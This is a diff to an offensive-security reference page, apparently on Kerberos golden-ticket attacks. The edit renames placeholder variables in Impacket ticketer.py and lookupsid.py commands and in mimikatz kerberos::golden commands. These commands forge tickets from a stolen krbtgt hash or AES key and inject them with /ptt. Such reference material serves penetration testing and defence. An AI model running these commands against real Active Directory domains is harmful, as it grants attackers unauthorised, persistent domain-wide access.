@@ -30,13 +30,13 @@ There are [Impacket](https://github.com/SecureAuthCorp/impacket) scripts for eac
 lookupsid.py -hashes 'LMhash:NThash' 'DOMAIN/DomainUser@DomainController' 0
 
 # Create the golden ticket (with an RC4 key, i.e. NT hash)
-ticketer.py -nthash "$krbtgtNThash" -domain-sid "$domainSID" -domain "$DOMAIN" "randomuser"
+ticketer.py -nthash "$KRBTGT_NT_HASH" -domain-sid "$DOMAIN_SID" -domain "$DOMAIN" $USER
 
 # Create the golden ticket (with an AES 128/256bits key)
-ticketer.py -aesKey "$krbtgtAESkey" -domain-sid "$domainSID" -domain "$DOMAIN" "randomuser"
+ticketer.py -aesKey "$KRBTGT_AES_KEY" -domain-sid "$DOMAIN_SID" -domain "$DOMAIN" $USER
 
 # Create the golden ticket (with an RC4 key, i.e. NT hash) with custom user/groups ids
-ticketer.py -nthash "$krbtgtNThash" -domain-sid "$domainSID" -domain "$DOMAIN" -user-id "$USERID" -groups "$GROUPID1,$GROUPID2,..." "randomuser"
+ticketer.py -nthash "$KRBTGT_NT_HASH" -domain-sid "$DOMAIN_SID" -domain "$DOMAIN" -user-id "$USER_RID" -groups "$GROUPID1,$GROUPID2,..." $USER
 ```
 
 
@@ -46,13 +46,13 @@ On Windows, [mimikatz](https://github.com/gentilkiwi/mimikatz) (C) can be used w
 
 ```bash
 # with an NT hash
-kerberos::golden /domain:$DOMAIN /sid:$DomainSID /rc4:$krbtgt_NThash /user:randomuser /ptt
+kerberos::golden /domain:$DOMAIN /sid:$DOMAIN_SID /rc4:$KRBTGT_NT_HASH /user:$USER /ptt
 
 # with an AES 128 key
-kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes128:$krbtgt_aes128_key /user:randomuser /ptt
+kerberos::golden /domain:$DOMAIN /sid:$DOMAIN_SID /aes128:$KRBTGT_AES_128_KEY /user:$USER /ptt
 
 # with an AES 256 key
-kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes256:$krbtgt_aes256_key /user:randomuser /ptt
+kerberos::golden /domain:$DOMAIN /sid:$DOMAIN_SID /aes256:$KRBTGT_AES_256_KEY /user:$USER /ptt
 ```
 
 For both mimikatz and Rubeus, the `/ptt` flag is used to automatically [inject the ticket](../ptt.md#injecting-the-ticket).
